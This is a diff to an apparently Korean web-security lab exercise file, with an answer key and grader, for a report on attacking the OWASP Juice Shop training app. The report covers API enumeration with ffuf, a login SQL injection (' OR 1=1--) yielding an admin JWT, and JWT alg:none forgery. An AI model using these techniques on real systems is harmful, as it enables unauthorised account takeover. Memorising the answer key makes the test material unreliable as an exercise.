+      ## 1. API 열거   : /rest/* 매핑(ffuf) — 발견 경로 <관찰값>
+      ## 2. 인증 우회   : 로그인 SQLi(email에 OR 1=1-- 주입) → admin JWT 획득 (OWASP A07)
+      ## 3. JWT 분석    : payload 디코드 → email=<관찰값>, role=admin / jwt_tool -X a 로 alg:none 위조
+      ## 4. 방어 가시성 : 로그인 SQLi → ModSec 룰 <관찰값>(942 대역). juice DetectionOnly라 200 통과+로그 기록
+      ## 결론          : 현대 웹 공격 = 엔드포인트 + 토큰 중심. JWT 는 디코드 가능 + 서명(alg:none) 우회 위험
       ```
+      작성 후 `cat ~/w03_report.md` 로 확인한다 — echo 로 찍어내는 게 아니라 직접 쓴 문서라야 보고서다.
 
       ## ✅ 합격 기준
       `JWT` 출력 시 통과. **근거:** 보고서에 API 열거·인증 우회·JWT 분석이 모두 포함되면 통과 — 공격이
@@ -433,22 +453,24 @@ steps:
     category: report
     points: 10
     answer: |
-      cat <<'EOF'
-      # 공격 W03 API/JWT 보고서
-      ## 1. API 열거: /rest/user, /rest/products... (ffuf 매핑)
-      ## 2. 인증 우회: 로그인 SQLi(' OR 1=1--) → admin JWT 획득(A07)
-      ## 3. JWT 디코드: payload base64 → email=admin@juice-sh.op 등 노출
-      ## 4. 방어: 로그인 SQLi → ModSec 942. JWT 약점(payload노출/alg none/약한키/검증부실)
-      ## 결론: 현대 웹 공격은 엔드포인트+토큰 중심. JWT는 디코드 가능 + 서명 우회 위험
+      # (편집기로 작성한 침투 보고서 — 채점용)
+      ssh att@192.168.0.202 'cat > ~/w03_report.md <<'"'"'EOF'"'"'
+      # 공격 W03 — API/JWT 침투 보고서 (juice.el34.lab)
+      ## 1. API 열거   : /rest/user, /rest/products, /rest/products/search (ffuf 매핑)
+      ## 2. 인증 우회   : 로그인 SQLi(email에 OR 1=1-- 주입) → admin JWT 획득 (OWASP A07)
+      ## 3. JWT 분석    : payload 디코드 → email=admin@juice-sh.op, role=admin / jwt_tool -X a 로 alg:none 위조
+      ## 4. 방어 가시성 : 로그인 SQLi → ModSec 942100. juice DetectionOnly라 200 통과+로그 기록
+      ## 결론          : 현대 웹 공격 = 엔드포인트 + 토큰 중심. JWT 는 디코드 가능 + 서명(alg:none) 우회 위험
       EOF
-    answer_detail: "API/JWT 공격의 한 사이클 종합 = 엔드포인트 열거(공격 표면 매핑) + 인증 우회(로그인 SQLi → admin JWT) + 토큰 조작/분석(payload 디코드로 내용 노출) + 방어 탐지(ModSec 942). 현대 웹앱의 공격 표면이 화면의 폼이 아니라 엔드포인트와 토큰으로 이동했음을 이해하고, 공격이 방어에 어떻게 보이는지까지 보고서로 남기는 것이 핵심이다. 채점은 보고서 출력에 JWT 가 포함되는지로 판정한다."
+      cat ~/w03_report.md'
+    answer_detail: "편집기로 ~/w03_report.md 를 직접 작성해 W03 한 사이클을 종합한다 = 엔드포인트 열거(ffuf 표면 매핑) + 인증 우회(로그인 SQLi → admin JWT, A07) + 토큰 분석(payload 디코드로 내용 노출 + jwt_tool -X a 로 alg:none 위조) + 방어 가시성(ModSec 942, juice DetectionOnly라 200 통과+로그 기록). 현대 웹앱의 공격 표면이 폼이 아니라 엔드포인트·토큰으로 이동했음을 이해하고, 공격이 방어에 어떻게 보이는지까지 문서로 남기는 것이 핵심이다. 보고서는 echo/heredoc 출력이 아니라 편집기로 직접 쓴 산출물이라야 한다. 채점은 저장 파일 출력에 JWT 가 포함되는지로 판정한다."
     expected_output: |
-      # 공격 W03 API/JWT 보고서
-      ## 1. API 열거: /rest/user, /rest/products... (ffuf 매핑)
-      ## 2. 인증 우회: 로그인 SQLi(' OR 1=1--) → admin JWT 획득(A07)
-      ## 3. JWT 디코드: payload base64 → email=admin@juice-sh.op 등 노출
-      ## 4. 방어: 로그인 SQLi → ModSec 942. JWT 약점(payload노출/alg none/약한키/검증부실)
-      ## 결론: 현대 웹 공격은 엔드포인트+토큰 중심. JWT는 디코드 가능 + 서명 우회 위험
+      # 공격 W03 — API/JWT 침투 보고서 (juice.el34.lab)
+      ## 1. API 열거   : /rest/user, /rest/products, /rest/products/search (ffuf 매핑)
+      ## 2. 인증 우회   : 로그인 SQLi(email에 OR 1=1-- 주입) → admin JWT 획득 (OWASP A07)
+      ## 3. JWT 분석    : payload 디코드 → email=admin@juice-sh.op, role=admin / jwt_tool -X a 로 alg:none 위조
+      ## 4. 방어 가시성 : 로그인 SQLi → ModSec 942100. juice DetectionOnly라 200 통과+로그 기록
+      ## 결론          : 현대 웹 공격 = 엔드포인트 + 토큰 중심. JWT 는 디코드 가능 + 서명(alg:none) 우회 위험
     verify:
       type: output_contains
       expect: 'JWT'
